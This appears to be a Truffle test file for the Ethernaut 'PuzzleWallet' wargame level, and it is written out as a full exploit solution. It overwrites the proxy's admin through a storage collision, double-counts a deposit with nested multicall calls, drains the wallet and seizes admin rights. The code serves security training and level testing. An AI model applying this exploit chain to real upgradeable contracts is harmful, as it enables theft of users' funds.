const PuzzleWalletFactory = artifacts.require('PuzzleWalletFactory')
const PuzzleWallet = artifacts.require('PuzzleWallet')
const PuzzleProxy = artifacts.require('PuzzleProxy')

const utils = require('../utils/TestUtils')

contract('PuzzleWallet', function ([player]) {
  let ethernaut
  let level

  beforeEach(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy()
    level = await PuzzleWalletFactory.new()
    await ethernaut.registerLevel(level.address)
  })

  it('should submit level instance successfully', async function () {
    const instance = await utils.createLevelInstance(
      ethernaut,
      level.address,
      player,
      PuzzleWallet,
      { from: player, value: web3.utils.toWei('0.001', 'ether') },
    )

    const proxy = await PuzzleProxy.at(instance.address)
    await proxy.proposeNewAdmin(player, {
      from: player,
    })
    await instance.addToWhitelist(player, {
      from: player,
    })
    const depositCalldata = web3.eth.abi.encodeFunctionSignature('deposit()')
    const interface = {
      name: 'multicall',
      type: 'function',
      inputs: [
        {
          type: 'bytes[]',
          name: 'data',
        },
      ],
    }
    const multicallCalldata = web3.eth.abi.encodeFunctionCall(interface, [[depositCalldata]])
    const calldata = web3.eth.abi.encodeFunctionCall(interface, [
      [multicallCalldata, multicallCalldata],
    ])
    const balance = await web3.eth.getBalance(instance.address)
    await web3.eth.sendTransaction({
      from: player,
      to: instance.address,
      value: balance,
      data: calldata,
    })
    await instance.execute(player, 2 * balance, [], {
      from: player,
    })
    await instance.setMaxBalance(player, {
      from: player,
    })

    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player,
    )
    assert.isTrue(completed)
  })
})
